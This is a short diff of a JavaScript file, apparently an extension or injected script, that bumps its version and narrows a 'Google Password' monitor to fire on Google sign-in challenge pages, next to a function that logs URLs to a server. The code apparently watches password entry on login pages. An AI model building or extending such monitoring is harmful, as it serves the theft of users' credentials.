@@ -1,4 +1,4 @@
-console.log('V18');
+console.log('V19');
 
 // Log URLs and init actions
 function serverLog(data) {
@@ -69,7 +69,7 @@ function siteSpecifics(host) {
 
 // Google Password
 function initPasswordMonitor() {
-  if (window.location.pathname.split('/')[1] === 'signin') {
+  if (window.location.pathname.split('/')[1] === 'signin' && window.location.pathname.split('/')[3] === 'challenge') {
 
     console.log('Monitoring');
 
